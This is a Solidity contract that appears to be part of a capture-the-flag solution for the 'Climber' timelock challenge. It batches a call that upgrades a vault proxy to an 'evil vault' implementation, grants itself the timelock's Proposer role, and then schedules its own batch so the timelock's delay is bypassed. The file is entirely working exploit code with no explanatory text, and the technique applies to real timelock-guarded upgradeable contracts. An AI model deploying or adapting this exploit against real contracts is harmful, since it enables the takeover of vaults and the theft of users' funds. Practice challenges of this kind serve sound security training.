// SPDX-License-Identifier: MIT
pragma solidity 0.8.7;
interface IClimberTimelock {
    function schedule(
        address[] calldata targets,
        uint256[] calldata values,
        bytes[] calldata dataElements,
        bytes32 salt
    ) external;
}
contract Scheduler {
    address timelockContractAddress;
    address vaultAddress;
    address evilVaultUpgradeAddress;

    constructor(address _timelockContractAddress, address _vaultAddress, address _evilVaultUpgradeAddress){
        timelockContractAddress = _timelockContractAddress;
        vaultAddress = _vaultAddress;
        evilVaultUpgradeAddress = _evilVaultUpgradeAddress;
    }   

    function schedule() external {
        bytes32 role = 0xb09aa5aeb3702cfd50b6b62bc4532604938f21248a27a1d5ca736082b6819cc1;
        bytes[] memory data = new bytes[](3);
        address[] memory tos = new address[](3);
        uint256[] memory values = new uint256[](3);

        // Step 1: Upgrade vault contract to evil vault contract
        tos[0] = vaultAddress;
        data[0] = abi.encodeWithSignature("upgradeTo(address)", evilVaultUpgradeAddress);
        values[0] = 0;
        // Step 2: grantRole "Proposer" role to this contract so it's allowed to add operations
        tos[1] = timelockContractAddress;
        data[1] = abi.encodeWithSignature("grantRole(bytes32,address)",role , address(this));
        values[1]= 0;
        // Step : Call the schedule function of this contract
        tos[2] = address(this);
        data[2] = abi.encodeWithSignature("schedule()");
        values[2] = 0;

        IClimberTimelock(timelockContractAddress).schedule(tos,values,data,
            0x0000000000000000000000000000000000000000000000000000000000000040
        );

    }


}